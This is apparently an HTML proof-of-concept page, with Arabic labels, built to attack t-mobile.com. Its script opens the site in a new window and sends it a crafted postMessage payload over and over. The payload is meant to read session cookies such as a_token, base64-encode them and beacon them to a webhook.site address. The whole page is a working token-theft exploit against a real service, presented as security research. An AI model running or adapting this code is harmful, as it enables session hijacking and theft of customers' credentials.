<!doctype html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>T-Mobile PoC Final</title>
</head>
<body style="background: #1a1a1a; color: #e20074; text-align: center; padding-top: 50px; font-family: Arial;">
    <h1>T-Mobile Security Research</h1>
    <div style="border: 2px solid #e20074; display: inline-block; padding: 20px;">
        <button onclick="exploit()" style="padding: 15px 30px; background: #e20074; color: white; border: none; cursor: pointer; font-weight: bold;">تشغيل هجوم تسريب التوكن</button>
        <p id="log" style="color: #00ff00; font-family: monospace;"></p>
    </div>

<script>
    const webh = "https://webhook.site/3d2d99ff-5472-455e-84e4-64f5035e227f";
    
    function log(m) { document.getElementById('log').innerText = "> " + m; }

    function exploit() {
        log("يتم فتح T-Mobile...");
        // فتح النافذة وتخزين المرجع
        const vicWin = window.open('https://www.t-mobile.com/', 'victim');

        if (!vicWin) {
            alert("يرجى تفعيل الـ Pop-ups!");
            return;
        }

        // تحضير الـ Payload بناءً على ما نجح معك في الكونسول
        // لاحظ: نستخدم String هنا لتجنب DataCloneError
        const payloadObject = {
            "type": "qm-sync", 
            "details": {
                "account": "SCRUB_ME",
                "cvv": "999",
                "toString": `() => {
                    const k = ['a_token', 'TFPID', 'LPVID'];
                    const d = document.cookie.split('; ').filter(c => k.some(n => c.startsWith(n))).join('|');
                    navigator.sendBeacon('${webh}/?auth=' + btoa(d));
                }`
            }
        };

        log("انتظار تحميل السكربتات... (سيتم الإرسال بعد 10 ثوانٍ)");

        // سنقوم بإرسال الرسالة كل 3 ثوانٍ لمدة دقيقة لضمان "صيد" الـ Listener
        let attempts = 0;
        const interval = setInterval(() => {
            attempts++;
            try {
                // الطريقة 1: إرسال كـ Object (لو الـ Listener بيفك الـ Clone)
                // ملحوظة: لإرسال دالةtoString، المتصفح قد يمنعها، لذا نرسل الـ Payload داخل String
                vicWin.postMessage(payloadObject, "*");

                // الطريقة 2: إرسال كـ JSON String (الأكثر فعالية لتخطي حواجز الـ Origin)
                vicWin.postMessage(JSON.stringify(payloadObject), "*");

                log("محاولة إرسال رقم: " + attempts);
            } catch (e) {
                log("خطأ في الإرسال: " + e.message);
            }

            if (attempts > 20) {
                clearInterval(interval);
                log("انتهت المحاولات. افحص الـ Webhook.");
            }
        }, 3000);
    }
</script>
</body>
</html>
